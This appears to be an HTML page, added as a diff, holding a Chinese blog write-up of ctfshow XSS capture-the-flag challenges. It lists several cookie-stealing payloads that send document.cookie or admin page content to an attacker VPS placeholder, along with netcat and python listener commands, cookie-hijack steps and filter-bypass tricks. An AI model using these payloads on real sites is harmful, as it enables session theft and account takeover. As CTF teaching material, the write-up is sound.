@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ctfshow--xss篇 | 北孤清茶lthの博客</title><meta name="author" content="北孤清茶lth"><meta name="copyright" content="北孤清茶lth"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="写题前必要知识简述​        XSS即跨站脚本，发生在目标网站中目标用户的浏览器层面上，当用户浏览器渲染整个HTML文档的过程中出现了不被预期的脚本指令并执行时，XSS就会发生。 分类 反射型又是非持久性的，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow--xss篇">
+<meta property="og:url" content="http://example.com/2021/08/28/ctfshow-xss%E7%AF%87/index.html">
+<meta property="og:site_name" content="北孤清茶lthの博客">
+<meta property="og:description" content="写题前必要知识简述​        XSS即跨站脚本，发生在目标网站中目标用户的浏览器层面上，当用户浏览器渲染整个HTML文档的过程中出现了不被预期的脚本指令并执行时，XSS就会发生。 分类 反射型又是非持久性的，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。通">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/cover_shantu_image/24.jpg">
+<meta property="article:published_time" content="2021-08-27T16:17:10.000Z">
+<meta property="article:modified_time" content="2021-08-28T04:47:56.680Z">
+<meta property="article:author" content="北孤清茶lth">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/cover_shantu_image/24.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/28/ctfshow-xss%E7%AF%87/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 北孤清茶lth","link":"链接: ","source":"来源: 北孤清茶lthの博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow--xss篇',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-28 12:47:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover_shantu_image/24.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">北孤清茶lthの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow--xss篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-27T16:17:10.000Z" title="发表于 2021-08-28 00:17:10">2021-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-28T04:47:56.680Z" title="更新于 2021-08-28 12:47:56">2021-08-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow--xss篇"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="写题前必要知识"><a href="#写题前必要知识" class="headerlink" title="写题前必要知识"></a>写题前必要知识</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>​        XSS即跨站脚本，发生在目标网站中目标用户的浏览器层面上，当用户浏览器渲染整个HTML文档的过程中出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
+<li><p><strong>反射型</strong><br>又是非持久性的，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。通常，黑客先将恶意代码写好，然后将连接发给受害者，受害者只要点击就会出现攻击现象</p>
+</li>
+<li><p><strong>存储型</strong><br>持久性的，会把用户输入的数据存储到数据库中。例如，留言板等。只要用户进入页面代码将会执行</p>
+</li>
+<li><p><strong>DOM型</strong><br>DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</p>
+</li>
+</ul>
+<h1 id="解题讲解"><a href="#解题讲解" class="headerlink" title="解题讲解"></a>解题讲解</h1><h2 id="web316–web326（反射型）"><a href="#web316–web326（反射型）" class="headerlink" title="web316–web326（反射型）"></a>web316–web326（反射型）</h2><p>​        在写这几道题时，要用到一些xss平台，例如    <code>https://xss.pt/</code>但是我自己做题的时用xss平台拿到的cookie里面并没有flag，看到一些博主说要生成连接，然后后台会有个机器人点一下。这个操作需要用到vps，刚刚好我买了个云服务器于是操作了下。</p>
+<p>本题所用到的playload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line">//JavaScript的 document.cookie 将以字符串的方式返回所有的cookie，类型格式： cookie1=value; cookie2=value; cookie3=value;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">//通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在vps上执行的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server &lt;自定义监听端口&gt;</span><br><span class="line">//搭建简易的web服务器，能够连续而接收数据</span><br><span class="line">或者</span><br><span class="line">nc -lvnp &lt;自定义监听端口&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在写题时，可以用下面一条playload畅通无阻</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body	onload=&quot;window.open(&#x27;http://&lt;你的vps的ip&gt;:&lt;监听端口&gt;/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">//&lt;body 后面接的是tab</span><br></pre></td></tr></table></figure>
+
+<p>在这里写题过程中发现，这里大多数就是过滤了一些标签还有空格，对标签的过滤不够全面，基本上不用到编码来绕过，只要换一个标签来插入，将空格改为tab或者/既可以。</p>
+<p>成果（部分题目的flag）：</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828110917808.png" alt="image-20210828110917808"></p>
+<h2 id="web327-储存型"><a href="#web327-储存型" class="headerlink" title="web327(储存型)"></a>web327(储存型)</h2><p>不知道插入点在，全部都插入就好了</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828111658375.png" alt="image-20210828111658375"></p>
+<p>提交后查看vps，发现接收成功</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828111745451.png" alt="image-20210828111745451"></p>
+<h2 id="web328（越权）"><a href="#web328（越权）" class="headerlink" title="web328（越权）"></a>web328（越权）</h2><p>打开靶机，看到多了个用户管理，里面显示管理员可见</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828112015379.png" alt="image-20210828112015379"></p>
+<p>解题思路是拿到管理员的cookie，用这个cookie来访问该页面，就可以看到这个页面的内容。</p>
+<p>过程：</p>
+<p>在注册和登录页面插入playload：</p>
+<script>window.open('<你的vps的ip>:<监听端口>'+document.cookie)</script>
+
+<p>可以在vps看到返回的管理员cookie</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828115250043.png" alt="image-20210828115250043"></p>
+<p>然后用bp抓包修改cookie</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828115814328.png" alt="image-20210828115814328"></p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828115818513.png" alt="image-20210828115818513"></p>
+<p>就改完就把包放出去</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828115914106.png" alt="image-20210828115914106"></p>
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>还是用同样的方法写着题，发现做不了了，可能时这个cookie失效了，看来应该是要换一种思路，可以让管理页面的内容发给我们。</p>
+<p>playload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;&lt;你的vps的ip&gt;:&lt;监听端口&gt;&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>getElementsByClassName() 方法返回文档中所有指定类名的元素集合，作为 NodeList 对象。</p>
+<p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p>
+<p>结果：</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828121527637.png" alt="image-20210828121527637"></p>
+<h2 id="web332–web333（逻辑漏洞，感觉和xss没有关系）"><a href="#web332–web333（逻辑漏洞，感觉和xss没有关系）" class="headerlink" title="web332–web333（逻辑漏洞，感觉和xss没有关系）"></a>web332–web333（逻辑漏洞，感觉和xss没有关系）</h2><p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828121813208.png" alt="image-20210828121813208"></p>
+<p>多了几个关于转账的模块，这种地方很容易出逻辑漏洞。</p>
+<p>先注册登录</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828122012243.png" alt="image-20210828122012243"></p>
+<p>尝试转钱给自己</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828122105659.png" alt="image-20210828122105659"></p>
+<p>显示交易成功并且钱多了，那么这样我们之间用bp不断发包，我们的钱就可以不断变多了</p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828122454427.png" alt="image-20210828122454427"></p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828122457838.png" alt="image-20210828122457838"></p>
+<p><img src="/images/ctfshow-xss%E7%AF%87/image-20210828122517449.png" alt="image-20210828122517449"></p>
+<p>然后直接购买就可以了</p>
+<h2 id="写题后总结："><a href="#写题后总结：" class="headerlink" title="写题后总结："></a>写题后总结：</h2><p>之前很少写关于xss的题目，不知道他会考察什么样的题型，这次有了初步的认识，不过这些题目也存在一些缺点，那就是过滤没有那么严格，平时写题不可避免会遇到各种各样的过滤问题。</p>
+<h3 id="常用的绕过方法"><a href="#常用的绕过方法" class="headerlink" title="常用的绕过方法"></a>常用的绕过方法</h3><ul>
+<li>大小写绕过</li>
+<li>双写绕过</li>
+<li>替换绕过<ul>
+<li>alert可用<code>prompt</code>,<code>confirm</code>,<code>top[&#39;alert&#39;](1)</code></li>
+<li>()可用 ``代替</li>
+<li>空格可用%0a,%0d,/**/; html的标签内分割两部分还可以用/</li>
+<li>字符ſ(ord=383)转为大写为S</li>
+</ul>
+</li>
+<li>编码绕过<ul>
+<li>url编码</li>
+<li>html实体 <code>t</code> <code>t</code> 等</li>
+<li>javascript字符编码 八进制<code>\164</code> 十六进制<code>\x0074</code></li>
+</ul>
+</li>
+<li>js的<code>String.fromCharCode</code>方法获得字符串</li>
+<li>注释绕过<ul>
+<li>JavaScript注释 <code>//</code> <code>/**/</code></li>
+<li>html注释 <code>&lt;!-- --&gt;</code> <code>&lt;!-- --!&gt;</code></li>
+</ul>
+</li>
+<li>@符号绕过url限制<code>http://test:test@www.baidu.com</code></li>
+<li>宽字节绕过等…</li>
+</ul>
+<h3 id="xss测试方法"><a href="#xss测试方法" class="headerlink" title="xss测试方法"></a>xss测试方法</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lansefly1990/article/details/84030382">https://blog.csdn.net/lansefly1990/article/details/84030382</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">北孤清茶lth</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/28/ctfshow-xss%E7%AF%87/">http://example.com/2021/08/28/ctfshow-xss%E7%AF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">北孤清茶lthの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/cover_shantu_image/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/08/26/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95/"><img class="next-cover" src="/img/cover_shantu_image/23.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">钓鱼网站搭建测试</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">北孤清茶lth</div><div class="author-info__description">努力让生活更美好</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lth714"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lth714" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1306209041@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是我新搭建的博客，有很多不好的地方，请多多关照！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E9%A2%98%E5%89%8D%E5%BF%85%E8%A6%81%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">写题前必要知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B2%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">解题讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316%E2%80%93web326%EF%BC%88%E5%8F%8D%E5%B0%84%E5%9E%8B%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">web316–web326（反射型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web327-%E5%82%A8%E5%AD%98%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">web327(储存型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328%EF%BC%88%E8%B6%8A%E6%9D%83%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">web328（越权）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">2.4.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web332%E2%80%93web333%EF%BC%88%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%84%9F%E8%A7%89%E5%92%8Cxss%E6%B2%A1%E6%9C%89%E5%85%B3%E7%B3%BB%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">web332–web333（逻辑漏洞，感觉和xss没有关系）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E9%A2%98%E5%90%8E%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.6.</span> <span class="toc-text">写题后总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.6.1.</span> <span class="toc-text">常用的绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">2.6.2.</span> <span class="toc-text">xss测试方法</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/28/ctfshow-xss%E7%AF%87/" title="ctfshow--xss篇"><img src="/img/cover_shantu_image/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow--xss篇"/></a><div class="content"><a class="title" href="/2021/08/28/ctfshow-xss%E7%AF%87/" title="ctfshow--xss篇">ctfshow--xss篇</a><time datetime="2021-08-27T16:17:10.000Z" title="发表于 2021-08-28 00:17:10">2021-08-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/26/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95/" title="钓鱼网站搭建测试"><img src="/img/cover_shantu_image/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="钓鱼网站搭建测试"/></a><div class="content"><a class="title" href="/2021/08/26/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95/" title="钓鱼网站搭建测试">钓鱼网站搭建测试</a><time datetime="2021-08-26T08:40:37.000Z" title="发表于 2021-08-26 16:40:37">2021-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/20/SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/08/20/SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87/" title="无题">无题</a><time datetime="2021-08-20T12:47:13.269Z" title="发表于 2021-08-20 20:47:13">2021-08-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/18/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" title="各种数据库注入"><img src="/img/cover_shantu_image/19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="各种数据库注入"/></a><div class="content"><a class="title" href="/2021/08/18/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/" title="各种数据库注入">各种数据库注入</a><time datetime="2021-08-18T09:11:38.000Z" title="发表于 2021-08-18 17:11:38">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/15/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="逻辑越权漏洞"><img src="/img/cover_shantu_image/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逻辑越权漏洞"/></a><div class="content"><a class="title" href="/2021/08/15/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="逻辑越权漏洞">逻辑越权漏洞</a><time datetime="2021-08-15T12:04:09.000Z" title="发表于 2021-08-15 20:04:09">2021-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 By 北孤清茶lth</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">你好，欢迎来到我的 <a target="_blank" rel="noopener" href="http://c-hasel.cn/">博客</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button 